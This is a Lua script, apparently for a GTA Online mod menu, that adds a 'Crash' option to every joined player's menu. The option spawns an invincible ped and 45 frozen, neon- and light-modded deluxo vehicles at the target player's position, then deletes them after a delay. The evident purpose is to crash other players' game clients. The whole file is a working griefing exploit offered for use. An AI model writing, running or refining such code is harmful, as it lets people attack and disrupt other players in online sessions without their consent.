util.require_natives(1672190175)
function Playerjoin(pid)
menu.action(menu.player_root(pid), "Crash", {""}, "", function()
		menu.trigger_commands("timesmoothing off")
		menu.trigger_commands("time 0")
		  while not STREAMING.HAS_MODEL_LOADED(util.joaat("deluxo")) do
            STREAMING.REQUEST_MODEL(util.joaat("deluxo"))
            util.yield()
          end
		local vehs = {}
		local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid),0,3,0)
		
		
		local Ped = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Ped)
		entities.set_can_migrate(Ped,false)
		PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(Ped,true)
		ENTITY.SET_ENTITY_INVINCIBLE(Ped,true)
		
		for i = 1 , 45 do
		vehs[i] = entities.create_vehicle(util.joaat("deluxo"), pos, ENTITY.GET_ENTITY_HEADING(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) - 180)
		ENTITY.FREEZE_ENTITY_POSITION(vehs[i],true)
		entities.set_can_migrate(vehs[i],false)
		PED.SET_PED_INTO_VEHICLE(Ped,vehs[i], -1)
		VEHICLE.SET_VEHICLE_ENGINE_ON(vehs[i],true,true,false)
		VEHICLE.SET_VEHICLE_KEEP_ENGINE_ON_WHEN_ABANDONED(vehs[i],true)
		ENTITY.SET_ENTITY_INVINCIBLE(vehs[i],true)
		  for m =0 ,3 do
		     VEHICLE.SET_VEHICLE_NEON_ENABLED(vehs[i],m,true)
		  end
		VEHICLE.SET_AMBIENT_VEHICLE_NEON_ENABLED(vehs[i])
		entities.set_upgrade_value(vehs[i],22,10)
		  for n = 17, 22 do
		     VEHICLE.TOGGLE_VEHICLE_MOD(vehs[i],n,true)
		  end
		VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehs[i],10)
		VEHICLE.SET_VEHICLE_HAS_UNBREAKABLE_LIGHTS(vehs[i],false)
		VEHICLE.SET_VEHICLE_LIGHTS(vehs[i],3)
		VEHICLE.SET_VEHICLE_HEADLIGHT_SHADOWS(vehs[i],3)
		VEHICLE.SET_VEHICLE_INTERIORLIGHT(vehs[i],true)
		VEHICLE.SET_VEHICLE_FORCE_INTERIORLIGHT(vehs[i],true)
		util.yield(50)
		end
		
		
		util.yield(5000)
		entities.delete(Ped)
	    for i = 1 , #vehs do
		  if vehs[i] ~= nil then
		    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehs[i])
		    entities.delete(vehs[i])
		    util.yield()
		  end
		end
		Models = nil
		pos = nil
		vehs = nil
end)


end
players.on_join(Playerjoin)
players.dispatch_on_join()
util.keep_running()